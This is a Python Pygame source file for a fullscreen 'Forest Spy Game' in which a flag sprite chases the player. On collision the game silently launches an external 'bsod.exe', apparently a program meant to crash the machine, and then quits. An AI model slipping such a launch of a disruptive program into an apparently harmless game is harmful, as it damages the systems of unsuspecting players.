import pygame
import sys
import math
import subprocess

# Initialize Pygame
pygame.init()

# Constants
SCREEN_WIDTH = 1280
SCREEN_HEIGHT = 720
FPS = 60
PLAYER_SPEED = 3
FLAG_SPEED = 5
BUGGY_SPEED = 10
BUGGY_THRESHOLD = 50
CHASE_DISTANCE = 150
CLOSE_DISTANCE = 100

# Colors
WHITE = (255, 255, 255)
RED = (255, 0, 0)
BLACK = (0, 0, 0)

# Load images
player_image = pygame.image.load('player.png')
player_back_image = pygame.image.load('playerback.png')
flag_image = pygame.image.load('britishflag.png')
background_image = pygame.image.load('forest_background.jpg')

# Resize images
player_image = pygame.transform.scale(player_image, (50, 50))
player_back_image = pygame.transform.scale(player_back_image, (50, 50))
flag_image = pygame.transform.scale(flag_image, (50, 50))
background_image = pygame.transform.scale(background_image, (SCREEN_WIDTH, SCREEN_HEIGHT))

# Set up the screen
screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.FULLSCREEN)
pygame.display.set_caption("Forest Spy Game")

# Set up clock
clock = pygame.time.Clock()

# Player
player_rect = player_image.get_rect()
player_rect.center = (SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2)
player_angle = 0
player_image_current = player_image

# Flag
flag_rect = flag_image.get_rect()
flag_rect.center = (100, 100)
flag_buggy = False
flag_chase = False

# Camera perspective
camera_front = False

# Main loop
while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()

    # Move player
    keys = pygame.key.get_pressed()
    if keys[pygame.K_LEFT]:
        player_rect.x -= PLAYER_SPEED
    if keys[pygame.K_RIGHT]:
        player_rect.x += PLAYER_SPEED
    if keys[pygame.K_UP]:
        player_rect.y -= PLAYER_SPEED
    if keys[pygame.K_DOWN]:
        player_rect.y += PLAYER_SPEED

    # Switch camera perspective
    if keys[pygame.K_q]:
        if camera_front:
            player_image_current = player_image
            camera_front = False
        else:
            player_image_current = player_back_image
            camera_front = True

    # Check distance between player and flag
    distance_to_flag = math.sqrt((player_rect.centerx - flag_rect.centerx)**2 +
                                 (player_rect.centery - flag_rect.centery)**2)

    # Update flag behavior
    if distance_to_flag < CLOSE_DISTANCE:
        flag_buggy = True
    if distance_to_flag < CHASE_DISTANCE:
        flag_chase = True
    else:
        flag_chase = False

    # Move flag
    if flag_chase:
        dx = player_rect.centerx - flag_rect.centerx
        dy = player_rect.centery - flag_rect.centery
        dist = math.hypot(dx, dy)
        if dist != 0:
            dx /= dist
            dy /= dist
            new_flag_x = flag_rect.x + dx * FLAG_SPEED
            new_flag_y = flag_rect.y + dy * FLAG_SPEED
            if 0 <= new_flag_x <= SCREEN_WIDTH - flag_rect.width:
                flag_rect.x = new_flag_x
            else:
                flag_rect.x = min(max(flag_rect.width, new_flag_x), SCREEN_WIDTH - flag_rect.width)
            if 0 <= new_flag_y <= SCREEN_HEIGHT - flag_rect.height:
                flag_rect.y = new_flag_y
            else:
                flag_rect.y = min(max(flag_rect.height, new_flag_y), SCREEN_HEIGHT - flag_rect.height)
    elif flag_buggy:
        new_flag_x = flag_rect.x + BUGGY_SPEED
        new_flag_y = flag_rect.y + BUGGY_SPEED
        if 0 <= new_flag_x <= SCREEN_WIDTH - flag_rect.width:
            flag_rect.x = new_flag_x
        else:
            flag_rect.x = min(max(flag_rect.width, new_flag_x), SCREEN_WIDTH - flag_rect.width)
        if 0 <= new_flag_y <= SCREEN_HEIGHT - flag_rect.height:
            flag_rect.y = new_flag_y
        else:
            flag_rect.y = min(max(flag_rect.height, new_flag_y), SCREEN_HEIGHT - flag_rect.height)

    # Check collision with flag
    if player_rect.colliderect(flag_rect):
        subprocess.call(['bsod.exe'])
        pygame.quit()
        sys.exit()

    # Clear the screen
    screen.blit(background_image, (0, 0))

    # Draw flag
    screen.blit(flag_image, flag_rect)

    # Draw player
    rotated_player = pygame.transform.rotate(player_image_current, player_angle)
    player_rect = rotated_player.get_rect(center=player_rect.center)
    screen.blit(rotated_player, player_rect)

    # Update the display
    pygame.display.flip()

    # Cap the frame rate
    clock.tick(FPS)
